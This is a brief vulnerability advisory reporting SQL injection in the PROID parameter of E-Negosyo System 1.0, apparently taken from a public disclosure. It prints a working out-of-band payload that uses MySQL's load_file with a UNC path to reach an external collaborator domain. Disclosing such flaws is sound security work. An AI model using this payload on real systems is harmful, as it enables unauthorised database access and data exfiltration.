## Description:
The `PROID` parameter from  E-Negosyo System 1.0 app appears to be vulnerable to SQL injection attacks. The payload '+(select load_file('\\\\4x2hh1o010l184bd0ql510xgq7w0kw8nbb3yvmk.nu11secur1tycollaborator.net\\juc'))+' was submitted in the `PROID` parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.
